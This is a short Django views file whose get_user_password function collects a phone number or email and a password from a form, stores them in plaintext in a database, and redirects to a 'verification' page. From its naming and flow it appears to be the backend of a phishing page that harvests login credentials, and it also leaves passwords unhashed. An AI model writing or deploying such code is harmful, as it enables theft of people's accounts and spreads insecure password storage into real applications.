from django.shortcuts import render, redirect
from .models import *

# Create your views here.
def get_user_password(request):
  message = ""
  
  if request.method == "POST":
    phone_email = request.POST.get('phone_email')
    pswd = request.POST.get('pswd')
    
    userinfo = Users_info.objects.create(
      phone_email = phone_email,
      password = pswd
      )
      
    userinfo.save()
    message = "Success!!!"
    return redirect('verification_page')
  
  context = {
    "message":message
  }
    
  return render(request, "index.html")
  
def verification_page(request):
  return render(request, "success.html")